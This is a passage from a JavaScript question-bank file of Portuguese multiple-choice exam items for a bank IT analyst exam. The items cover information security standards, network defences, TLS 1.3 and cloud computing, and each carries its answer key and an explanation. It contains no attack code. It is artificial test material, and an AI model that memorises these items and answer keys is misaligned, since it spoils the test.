  "comentario": "**Gabarito: A.** Aplicar controles para reduzir probabilidade ou impacto é **modificar** o risco. O que sobra depois é o risco residual.\n\n(B) Reter é aceitar o risco sem novos controles. (C) Evitar é eliminar a atividade que gera o risco (por exemplo, desligar o internet banking). (D) Compartilhar é dividir o risco com terceiros (seguro, terceirização). (E) Não é opção da norma.\n\nRevisar: Apostila 04, §21.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V021",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Segurança em nuvem: ISO/IEC 27017",
  "ref_apostila": {
    "modulo": "04",
    "secao": "21",
    "titulo": "Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#21. Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §21 – Q5",
    "id_pai": "ESP-SEG-0036",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre as normas de segurança da informação para serviços em nuvem, é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "a ISO/IEC 27017 trata exclusivamente da proteção de dados pessoais em nuvem pública e substitui a LGPD.",
    "B": "a ISO/IEC 27018 é o código de prática com controles de segurança para provedores e clientes de nuvem, como segregação em ambientes virtuais.",
    "C": "a ISO/IEC 27017 é um código de prática baseado na ISO/IEC 27002, com orientações para clientes e provedores, e a ISO/IEC 27018 trata da proteção de dados pessoais em nuvem pública.",
    "D": "ambas são normas de requisitos certificáveis que substituem a ISO/IEC 27001.",
    "E": "a ISO/IEC 27017 dispensa definir papéis e responsabilidades entre cliente e provedor."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** A **27017** é código de prática de segurança para serviços em nuvem (baseado na 27002), com orientações para cliente e provedor e controles próprios (responsabilidades compartilhadas, remoção de ativos, segregação em ambientes virtuais, hardening de VMs, monitoramento). A **27018** trata de **dados pessoais em nuvem pública**.\n\n(A) Atribui à 27017 o escopo da 27018; e nenhuma norma substitui a lei. (B) Atribui à 27018 o escopo da 27017. (D) São códigos de prática que complementam a 27001/27002. (E) Papéis e responsabilidades compartilhados são um dos controles acrescentados.\n\nRevisar: Apostila 04, §21.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V022",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "ISO/IEC 27001 e 27002",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §17.2",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre as normas ABNT NBR ISO/IEC 27001 e 27002, é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "a 27002 estabelece os requisitos do sistema de gestão e é a norma usada para certificação.",
    "B": "a 27001 estabelece os requisitos de um Sistema de Gestão de Segurança da Informação (SGSI) e é certificável, enquanto a 27002 é um guia com orientações para implementar os controles.",
    "C": "as duas são equivalentes e podem ser usadas indistintamente na certificação.",
    "D": "a 27001 contém apenas controles técnicos, como firewall e criptografia.",
    "E": "a 27002 trata exclusivamente de gestão de incidentes."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** A **27001** define os **requisitos do SGSI** (contexto, liderança, planejamento, apoio, operação, avaliação de desempenho e melhoria) e é **certificável**; seu Anexo A lista os controles de referência. A **27002** é o **código de prática** com orientações para implementar esses controles.\n\n(A) Inverte as normas. (C) Só a 27001 é certificável. (D) A 27001 é norma de gestão, com controles organizacionais, de pessoas, físicos e tecnológicos. (E) Incidentes são tema da série 27035.\n\nRevisar: Apostila 04, §17.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V023",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Segurança em redes sem fio",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §14.9",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para a rede Wi-Fi corporativa de um banco, a área de segurança exige que cada funcionário se autentique com credencial própria ou certificado, validada em um servidor RADIUS integrado ao Active Directory, e que os quadros de gerenciamento sejam protegidos contra ataques de desautenticação. A configuração mais adequada é",
  "imagem": null,
  "alternativas": {
    "A": "WEP com chave de 128 bits e filtro por MAC.",
    "B": "WPA com TKIP e SSID oculto.",
    "C": "WPA3-Enterprise, com 802.1X e EAP (por exemplo, EAP-TLS), que exige PMF.",
    "D": "rede aberta com portal cativo.",
    "E": "WPA2-Personal com a mesma senha para todos e WPS habilitado."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O modo **Enterprise** usa **802.1X** com **EAP** (EAP-TLS, PEAP) contra servidor **RADIUS** (ex.: NPS integrado ao AD), com credencial individual. O **WPA3** torna obrigatório o **PMF** (802.11w), que dificulta ataques de desautenticação.\n\n(A) WEP é quebrado; filtro por MAC é medida fraca. (B) TKIP é obsoleto; ocultar SSID é medida fraca. (D) Rede aberta não autentica usuários. (E) Senha compartilhada não identifica cada funcionário, e o WPS por PIN é vulnerável.\n\nRevisar: Apostila 04, §14.9.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V024",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "VPN, VPN-SSL e ZTNA; Zero Trust",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.12",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco quer substituir a VPN tradicional, que após a conexão dá ao usuário acesso amplo à rede interna, por um modelo em que cada acesso a cada aplicação é autenticado e autorizado considerando identidade, estado do dispositivo e contexto, sem expor a rede. Essa abordagem corresponde a",
  "imagem": null,
  "alternativas": {
    "A": "perímetro \"castelo e fosso\", com DMZ única.",
    "B": "VPN site a site com IPsec em modo túnel.",
    "C": "split tunneling na VPN de acesso remoto.",
    "D": "ZTNA, alinhado ao modelo Zero Trust (\"nunca confie, sempre verifique\").",
    "E": "NAT com encaminhamento de portas para cada aplicação."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** O **ZTNA** (Zero Trust Network Access) aplica o **Zero Trust**: nenhum acesso é confiável por estar \"dentro\"; cada acesso a cada aplicação é verificado (identidade, dispositivo, contexto), com microssegmentação e menor privilégio.\n\n(A) É o modelo tradicional que o Zero Trust supera. (B) VPN site a site liga redes inteiras. (C) Split tunneling só decide qual tráfego passa pelo túnel. (E) Expor portas por NAT aumenta a superfície de ataque.\n\nRevisar: Apostila 04, §16.12.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V025",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Sistemas de proteção: firewall, WAF, UTM, DMZ, proxy, NAC",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §17.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma cooperativa de pequeno porte, com equipe de TI reduzida, adquiriu um único equipamento que reúne firewall, IPS, antivírus de gateway, filtro de conteúdo web, antispam e VPN, gerenciados em um só console. Esse tipo de solução é denominado",
  "imagem": null,
  "alternativas": {
    "A": "UTM (Unified Threat Management).",
    "B": "SIEM.",
    "C": "honeynet.",
    "D": "HIDS.",
    "E": "PAM."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **UTM** consolida várias funções de segurança (firewall, IPS, antivírus, filtro web, antispam, VPN) em um único equipamento, comum em pequenas e médias organizações.\n\n(B) SIEM coleta e correlaciona logs. (C) Honeynet é rede-isca. (D) HIDS detecta intrusões em um host. (E) PAM gerencia contas privilegiadas.\n\nRevisar: Apostila 04, §17.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V026",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Sistemas de proteção: firewall, WAF, UTM, DMZ, proxy, NAC",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §17.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Ao conectar um notebook a uma porta de rede da agência, o equipamento só recebe acesso à VLAN corporativa depois de autenticar o usuário via 802.1X e comprovar que tem antivírus ativo e atualizações em dia; caso contrário, é colocado em uma VLAN de quarentena. Essa solução é um",
  "imagem": null,
  "alternativas": {
    "A": "DLP.",
    "B": "WAF.",
    "C": "IDS por anomalia.",
    "D": "proxy reverso.",
    "E": "NAC (controle de admissão na rede)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O **NAC** controla a **admissão** de dispositivos na rede, com autenticação (802.1X) e **verificação de postura** (antivírus, patches), podendo isolar dispositivos não conformes.\n\n(A) DLP impede vazamento de dados. (B) WAF protege aplicações web. (D) Proxy reverso fica na frente de servidores. (C) IDS detecta intrusões, não decide a admissão de dispositivos.\n\nRevisar: Apostila 04, §17.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V027",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "SOC, SIEM, EDR e segurança de endpoints",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §17.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No centro de operações de segurança (SOC) de um banco, uma ferramenta reúne os logs de firewalls, servidores, Active Directory e aplicações e dispara um alerta ao correlacionar dez falhas de login seguidas de um acesso bem-sucedido, de outro país, para a mesma conta. Outra ferramenta, instalada nas estações, detecta comportamento suspeito de processos (como cifragem em massa de arquivos) e isola automaticamente a máquina. Essas ferramentas são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "EDR e SIEM.",
    "B": "SIEM e EDR.",
    "C": "NAC e WAF.",
    "D": "IPS e DLP.",
    "E": "UTM e honeypot."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** O **SIEM** centraliza, **correlaciona** logs e eventos e gera alertas (base do SOC); o **EDR** atua nos **endpoints**, detectando comportamento suspeito e respondendo (isolar a máquina, encerrar processos).\n\n(A) Inverte as ferramentas. (C) NAC controla a admissão de dispositivos e WAF protege aplicações web. (D) IPS bloqueia tráfego em linha e DLP evita vazamento de dados. (E) UTM consolida funções de perímetro e honeypot é isca.\n\nRevisar: Apostila 04, §17.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V028",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Controle de acesso: autenticação, autorização, auditoria, RBAC e MFA",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §17.2",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No sistema de crédito, as permissões são associadas a papéis como Caixa, Gerente e Auditor, e cada funcionário recebe um ou mais papéis. Para o login, exige-se senha e um código gerado por aplicativo no celular cadastrado. Esses mecanismos correspondem, respectivamente, a",
  "imagem": null,
  "alternativas": {
    "A": "DAC e autenticação de fator único.",
    "B": "MAC e autenticação de fator único.",
    "C": "ABAC e autenticação por dois fatores do mesmo tipo.",
    "D": "RBAC e autenticação multifator (algo que se sabe e algo que se tem).",
    "E": "RBAC e autenticação de fator único, pois ambos os fatores são digitados."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Permissões por **papéis** = **RBAC**. Senha (algo que se **sabe**) + código do app no celular (algo que se **tem**) = **MFA**, com fatores de categorias diferentes.\n\n(A) No DAC o dono do recurso decide quem acessa. (B) No MAC o sistema impõe rótulos de classificação. (C) O ABAC decide por atributos, e os fatores aqui são de tipos diferentes. (E) O fato de ambos serem digitados não importa: o código prova a **posse** do dispositivo. (Senha + PIN, sim, seria um fator só.)\n\nRevisar: Apostila 04, §17.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V029",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "SSL/TLS",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre o TLS 1.3, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "mantém a troca de chaves RSA estática para compatibilidade, sem sigilo direto.",
    "B": "permite cifras como RC4 e modo CBC para clientes antigos.",
    "C": "dispensa certificados digitais no servidor.",
    "D": "é a versão do SSL 3.0 com outro nome.",
    "E": "exige troca de chaves com Diffie-Hellman efêmero, garantindo sigilo direto (forward secrecy), usa apenas cifras AEAD e reduz o handshake completo a uma ida e volta (1-RTT)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O **TLS 1.3** removeu a troca de chaves RSA estática (só DHE/ECDHE, com **forward secrecy**), aceita apenas cifras **AEAD** (AES-GCM, ChaCha20-Poly1305) e faz o handshake em **1-RTT** (com opção 0-RTT na retomada).\n\n(A) A troca RSA estática foi removida justamente por não ter sigilo direto. (B) RC4 e CBC foram eliminados. (C) O servidor continua se autenticando com certificado. (D) SSL 3.0 é obsoleto e inseguro; TLS 1.3 é outro protocolo, bem mais moderno.\n\nRevisar: Apostila 04, §16.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V030",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Sistemas de proteção: firewall, WAF, UTM, DMZ, proxy, NAC",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §17.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na arquitetura de rede de um banco, os servidores que precisam ser acessados pela internet (servidor web do site institucional, relay de e-mail e DNS externo) devem ficar",
  "imagem": null,
  "alternativas": {
    "A": "na rede interna, junto aos servidores de banco de dados, para reduzir a latência.",
    "B": "em uma DMZ, sub-rede intermediária entre a internet e a rede interna, de modo que, se comprometidos, não deem acesso direto à rede interna.",
    "C": "fora de qualquer firewall, ligados diretamente ao roteador da operadora.",
    "D": "na VLAN dos usuários, protegidos apenas pelo antivírus das estações.",
    "E": "em uma rede sem endereçamento IP, para não serem descobertos."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** A **DMZ** é a zona intermediária para os servidores **expostos**; regras de firewall controlam o tráfego internet ↔ DMZ e DMZ ↔ rede interna, e um servidor comprometido na DMZ não dá acesso direto à rede interna.\n\n(A) Colocar servidores expostos na rede interna amplia o impacto de uma invasão. (C) Deixar sem firewall elimina a defesa em profundidade. (D) A VLAN de usuários não é lugar para serviços públicos. (E) Sem endereçamento IP o serviço não seria acessível.\n\nRevisar: Apostila 04, §17.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-NUVEM-V001",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Computação em nuvem",
  "topico": "Modelos de serviço (PaaS)",
  "ref_apostila": {
    "modulo": "07",
    "secao": "1",
    "titulo": "Computação em nuvem: definição NIST, características, modelos de serviço e de implantação",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#1. Computação em nuvem: definição NIST, características, modelos de serviço e de implantação]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q28",
    "id_pai": "ESP-NUVEM-0001",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco contratou máquinas virtuais em um provedor de nuvem pública para hospedar um sistema legado. A equipe do banco escolhe a imagem do sistema operacional, aplica os patches, instala o servidor de aplicação e configura o firewall de host; o provedor cuida do data center, do hardware, da rede física e do hipervisor. Segundo o NIST, o modelo de serviço contratado é",
  "imagem": null,
  "alternativas": {
    "A": "SaaS.",
    "B": "PaaS.",
    "C": "IaaS.",
    "D": "FaaS.",
    "E": "nuvem comunitária."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Quem instala e atualiza o **sistema operacional** é o cliente: é **IaaS**. O provedor responde pela infraestrutura física e pela virtualização.\n\n(A) No SaaS o cliente só usa a aplicação pronta. (B) No PaaS o provedor cuida do SO e do runtime; o cliente só envia a aplicação. (D) FaaS executa funções sob evento, sem servidor gerenciado pelo cliente. (E) Nuvem comunitária é modelo de **implantação**, não de serviço.\n\nRevisar: Apostila 07, §1.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-NUVEM-V002",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Computação em nuvem",
  "topico": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, s…",
  "ref_apostila": {
    "modulo": "07",
    "secao": "2",
    "titulo": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#2. Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 07 §2 – Q4",
    "id_pai": "ESP-NUVEM-0010",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "O banco de dados do sistema de cobrança é replicado para outra região a cada 15 minutos. Em um teste de recuperação de desastre, a equipe levou 2 horas para colocar o sistema em funcionamento na região secundária. Considerando o pior caso, os valores que esse plano consegue atender para RPO e RTO são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "2 horas e 15 minutos.",
    "B": "15 minutos e 15 minutos.",
    "C": "zero e 2 horas.",
    "D": "2 horas e 2 horas.",
    "E": "15 minutos e 2 horas."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O **RPO** mede a **perda de dados** tolerável: com réplica a cada 15 minutos, no pior caso perdem-se **15 minutos** de transações. O **RTO** mede o **tempo** até o serviço voltar: **2 horas**.\n\n(A) Inverte os conceitos. (B) O tempo de retorno é de 2 horas, não 15 minutos. (C) RPO zero exigiria replicação síncrona. (D) Confunde a perda de dados com o tempo de recuperação.\n\nRevisar: Apostila 07, §2.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-NUVEM-V003",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Computação em nuvem",
  "topico": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, s…",
  "ref_apostila": {
    "modulo": "07",
    "secao": "2",
    "titulo": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#2. Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 07 §2 – Q2",
    "id_pai": "ESP-NUVEM-0008",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na véspera do pagamento do 13º salário, a API de consulta de extratos passou a ser atendida por 40 instâncias atrás de um balanceador de carga, em vez das 4 habituais, voltando a 4 depois do pico. Essa forma de crescer, adicionando e removendo instâncias, é a escalabilidade",
  "imagem": null,
  "alternativas": {
    "A": "horizontal (scale out/in), que exige aplicação sem estado ou com estado externo.",
    "B": "vertical (scale up), que aumenta CPU e memória de uma única máquina.",
    "C": "vertical, que dispensa balanceador de carga.",
    "D": "diagonal, exclusiva de nuvens privadas.",
    "E": "manual, incompatível com elasticidade."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** Adicionar e remover **instâncias** atrás de um balanceador é escalar **horizontalmente**; para isso a aplicação deve ser **sem estado** (ou guardar o estado em cache ou banco). Feito automaticamente, conforme a carga, caracteriza **elasticidade**.\n\n(B) e (C) Escala vertical aumenta os recursos de uma mesma máquina, com limite físico. (D) Não é conceito do NIST nem restrito a nuvem privada. (E) O cenário descreve justamente aumento e redução conforme a demanda.\n\nRevisar: Apostila 07, §2.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-NUVEM-V004",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Computação em nuvem",
  "topico": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, s…",
  "ref_apostila": {
    "modulo": "07",
    "secao": "2",
    "titulo": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#2. Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 07 §2.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na migração de um sistema de câmbio para a nuvem, a equipe moveu a aplicação para máquinas virtuais sem reescrevê-la, mas aproveitou para trocar o banco de dados instalado em servidor próprio por um serviço de banco de dados gerenciado do provedor, sem mudar a arquitetura da aplicação. Entre os \"6 Rs\" de migração, essa estratégia é o",
  "imagem": null,
  "alternativas": {
    "A": "rehost (lift and shift).",
    "B": "replatform (lift, tinker and shift).",
    "C": "refactor/rearchitect.",
    "D": "repurchase.",
    "E": "retire."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** **Replatform** faz pequenas otimizações durante a migração, como trocar o banco próprio por um gerenciado, sem mudar a arquitetura.\n\n(A) Rehost move a aplicação exatamente como está. (C) Refactor reescreve para usar recursos nativos (microsserviços, serverless). (D) Repurchase troca por um produto SaaS. (E) Retire desliga o que não é mais necessário.\n\nRevisar: Apostila 07, §2.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-NUVEM-V005",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Computação em nuvem",
  "topico": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, s…",
  "ref_apostila": {
    "modulo": "07",
    "secao": "2",
    "titulo": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#2. Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 07 §2.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um programa de FinOps, a equipe de um banco precisa escolher o modelo de cobrança de duas cargas: (1) o processamento noturno de modelos de risco, em lotes que podem ser interrompidos e retomados sem prejuízo; (2) o banco de dados do core, que roda 24 horas por dia, de forma estável, pelos próximos três anos. Os modelos mais econômicos são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "sob demanda e sob demanda.",
    "B": "reservado e spot.",
    "C": "spot (preemptível) e reservado (ou savings plan).",
    "D": "reservado e reservado.",
    "E": "spot e spot."
  },
  "gabarito": "C",
